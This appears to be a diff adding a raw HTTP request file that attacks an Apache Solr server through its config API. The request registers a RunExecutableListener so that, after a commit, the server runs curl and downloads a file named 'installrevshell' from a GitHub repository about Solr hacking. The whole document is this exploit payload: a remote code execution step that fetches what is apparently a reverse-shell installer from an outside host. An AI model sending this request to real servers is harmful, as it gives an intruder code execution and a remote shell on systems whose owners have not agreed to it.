@@ -1,0 +1,15 @@
+POST /solr/NAME_OF_COLLECTION/config HTTP/1.1
+Host: IP_OF_SOLR_SERVER:8983
+Content-Type: application/json
+Content-Length: 276
+
+{
+  "update-listener" : {
+    "event":"postCommit",
+    "name":"newlistener",
+    "class":"solr.RunExecutableListener",
+    "exe":"curl",
+    "dir":"/usr/bin/",
+    "args":["https://raw.githubusercontent.com/tdwyer/apache_solr_hacking/master/installrevshell","-o","/tmp/installrevshell"]
+  }
+}
